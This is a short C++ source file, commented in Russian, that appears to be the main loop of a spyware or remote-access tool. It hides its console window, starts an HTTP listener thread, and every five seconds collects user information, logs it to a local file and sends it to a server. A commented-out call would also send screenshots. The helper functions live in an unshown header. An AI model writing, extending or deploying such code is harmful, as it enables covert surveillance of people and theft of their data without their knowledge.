#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include "Tools.h"

// Объявление функции слушателя
void startHttpListener();

int main() {
    // Скрываем консоль
    FreeConsole();

    // Запускаем HTTP-слушатель в отдельном потоке
    std::thread listenerThread(startHttpListener);
    

    while (true) {
        std::string data = getUserInfo();

        std::ofstream log("activity_log.txt", std::ios::app);
        log << data << std::endl;

        sendDataToServer(data);
        //std::this_thread::sleep_for(std::chrono::seconds(5));
        //sendScreenshotToServer();

        std::this_thread::sleep_for(std::chrono::seconds(5));
    }

    listenerThread.join(); // не обязателен, поток бесконечный
    return 0;
}
